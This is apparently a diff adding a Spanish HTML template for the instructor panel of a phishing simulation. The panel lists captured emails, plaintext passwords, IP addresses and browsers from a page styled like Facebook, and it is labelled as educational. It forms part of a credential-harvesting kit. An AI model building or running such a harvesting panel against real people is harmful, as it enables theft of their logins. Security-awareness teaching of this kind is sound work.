@@ -1,0 +1,154 @@
+<!-- Este bloque debe guardarse como 'templates/data.html' -->
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Datos Capturados - Solo Para Instructor</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 20px;
+            color: #333;
+        }
+        
+        header {
+            background-color: #1877f2;
+            color: white;
+            padding: 20px;
+            text-align: center;
+            border-radius: 5px;
+            margin-bottom: 30px;
+        }
+        
+        h1 {
+            margin-top: 0;
+        }
+        
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-bottom: 20px;
+        }
+        
+        th, td {
+            padding: 10px;
+            border: 1px solid #ddd;
+            text-align: left;
+        }
+        
+        th {
+            background-color: #f2f2f2;
+        }
+        
+        tr:nth-child(even) {
+            background-color: #f9f9f9;
+        }
+        
+        .actions {
+            margin-top: 20px;
+            text-align: center;
+        }
+        
+        .clear-button {
+            background-color: #f44336;
+            color: white;
+            border: none;
+            padding: 10px 15px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        
+        .back-button {
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            padding: 10px 15px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-left: 10px;
+        }
+        
+        .warning {
+            background-color: #ffebee;
+            border: 1px solid #f44336;
+            padding: 15px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            text-align: center;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Datos Capturados en la Simulación</h1>
+        <p>Panel del Instructor - SOLO PARA FINES EDUCATIVOS</p>
+    </header>
+    
+    <div class="warning">
+        IMPORTANTE: Esta página debe ser accesible ÚNICAMENTE por el instructor del curso.
+        Estos datos deben ser eliminados después de la demostración educativa.
+    </div>
+    
+    {% if data|length > 0 %}
+    <table>
+        <thead>
+            <tr>
+                <th>#</th>
+                <th>Correo/Usuario</th>
+                <th>Contraseña</th>
+                <th>Dirección IP</th>
+                <th>Navegador</th>
+                <th>Fecha y Hora</th>
+            </tr>
+        </thead>
+        <tbody>
+            {% for entry in data %}
+            <tr>
+                <td>{{ loop.index }}</td>
+                <td>{{ entry.email }}</td>
+                <td>{{ entry.password }}</td>
+                <td>{{ entry.ip_address }}</td>
+                <td>{{ entry.user_agent }}</td>
+                <td>{{ entry.timestamp }}</td>
+            </tr>
+            {% endfor %}
+        </tbody>
+    </table>
+    {% else %}
+    <p>No hay datos capturados todavía.</p>
+    {% endif %}
+    
+    <div class="actions">
+        <button class="clear-button" id="clearData">Eliminar todos los datos</button>
+        <button class="back-button" onclick="window.location.href='/'">Volver al inicio</button>
+    </div>
+    
+    <script>
+        document.getElementById('clearData').addEventListener('click', function() {
+            if (confirm('¿Estás seguro de que deseas eliminar todos los datos capturados? Esta acción no se puede deshacer.')) {
+                fetch('/clear', {
+                    method: 'POST',
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.success) {
+                        alert('Datos eliminados correctamente.');
+                        window.location.reload();
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    alert('Error al eliminar los datos.');
+                });
+            }
+        });
+    </script>
+</body>
+</html>
